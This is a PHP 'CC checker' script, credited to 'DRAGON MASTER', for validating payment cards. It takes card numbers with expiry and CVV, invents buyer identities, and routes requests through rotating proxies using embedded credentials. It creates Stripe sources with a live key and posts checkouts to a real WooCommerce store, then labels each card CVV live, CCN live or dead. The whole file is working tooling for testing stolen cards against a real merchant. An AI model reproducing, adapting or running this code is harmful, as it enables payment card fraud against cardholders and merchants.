<?php


//================[Functions and Variables]================//
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


$last4 = substr($cc, -4);


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


$Websharegay = rand(0,250);
$rp1 = array(
    1 => 'eytbkuxa-rotate:bzcdmxhr13xi',
);
$rotate = $rp1[array_rand($rp1)];

$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_PROXY => 'http://p.webshare.io:80',
    CURLOPT_PROXYUSERPWD => $rotate,
    CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
    $ip = "🟢";
}
if (empty($ip1)){
    $ip = "❌";
}
echo '[ IP: '.$ip.' ] ';

///==================================================================///

//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'method: POST';
$headers[] = 'path: /v1/sources';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Chromium";v="106", "Not.A/Brand";v="24", "Opera";v="92"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition beta)';


curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=hemlu+'.$lastname.'&owner[email]=hsus'.$last.'57%40gmail.com&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fa8b551343%3B+stripe-js-v3%2Fa8b551343&time_on_page=61398&key=pk_live_bT48w0LsSgMwPcbO3xYd8IhE');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
//=======================[1 REQ-END]==============================//


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://kingcomposer.com/checkout/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: kingcomposer.com';
////$headers[] = 'method: POST';
////$headers[] = 'path: /checkout';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: woocommerce_items_in_cart=1; woocommerce_cart_hash=4e758ea907a525311943a63c4aa03a12; wp_woocommerce_session_e44172e8e9dd5fdf359ef011b222e12c=a648acc7d93b5b0f3c2b893f558eec63%7C%7C1666135471%7C%7C1666131871%7C%7Cc16cc84477e3ce03ac99d15b2ec1d9cb';
$headers[] = 'origin: https://kingcomposer.com';
$headers[] = 'referer: https://kingcomposer.com/checkout/';
$headers[] = 'sec-ch-ua: "Chromium";v="106", "Not.A/Brand";v="24", "Opera";v="92"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition beta)';
$headers[] = 'X-Requested-With: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=hemlu&billing_last_name='.$lastname.'&billing_email=hsus'.$lastname.'57%40gmail.com&createaccount=1&account_username=hemlu'.$lastname.'&account_password=Kill%40123&payment_method=stripe&terms=on&terms-field=1&_wpnonce=30f46701a4&_wp_http_referer=%2Fcheckout%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$id.'');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');


$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
$info = curl_getinfo($ch);
$time = $info['total_time'];

//=======================[2 REQ-END]==============================//


//=======================[MADE BY]==============================//

$MADEBY = "★KM™";

//[You Have  To Change Name Here Automatically In All Response Will Change ]//

//=======================[MADE BY]==============================//


//=======================[Responses]==============================//

# - [CVV Responses ] - #

if ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜  CVV PASS ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, "Your card has insufficient funds.")) || (strpos($result2, '"cvc_check": "fail"'))){
    echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜ R ➜ Your card has insufficient funds.  ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [CVV Responses ] - #


# - [CCN Responses ] - #

elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "security code is invalid.")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc"))){
    echo '<br><span class="badge badge-warning">#CCN ✓ </span> : ' . $lista . ' ➜  CCN Live ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';

}
#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #

elseif ((strpos($result2, 'stolen_card')) || (strpos($result2, "lost_card")) || (strpos($result2, "pickup_card."))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$msg.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}


# -- [Stolen,Lost,Pickup Responses END ] - #



# -[Reprovada,Decline Responses ] - #

elseif ((strpos($result2, 'Your card was declined')) || (strpos($result2, "generic_decline")) || (strpos($result2, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result2, "processing_error")) || (strpos($result2, "parameter_invalid_empty")) || (strpos($result2, 'lock_timeout')) || (strpos($result2, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$msg.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, 'Payment cannot be processed, missing credit card number')) || (strpos($result2, "missing_payment_information")) || (strpos($result2, 'three_d_secure_redirect')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, "service_not_allowed")) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, 'Your card does not support this type of purchase.')) || (strpos($result2, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$msg.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif (strpos($result2,  'Your card has expired.')) {
  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card has expired. ➜:  DEAD ➜ IP: '.$msg.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

elseif (strpos($result2,  'Your card number is incorrect.')) {
  echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card number is incorrect. ➜  DEAD ➜ IP: '.$msg.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [Reprovada,Decline Responses END ] - #



# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #
elseif 
(strpos($result2,  '-1')) {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ '.$msg.' ➜ DEAD ➜ IP: '.$msg.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

else {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ '.$msg.' ➜ DEAD ➜ IP: '.$msg.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
}

# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
//=======================[Responses-END]==============================//

curl_close($ch);
ob_flush();

echo "<b>1REQ Result:</b> $result1<br><br>";
echo "<b>2REQ Result:</b> $result2<br><br>";

//=============================================================//
//================[Made By :- [🇮🇳]DRAGON MASTER]===============//
//============[Join OUR TEAM   @DragonBin + @DRAGONCCCHECKER]==//
?>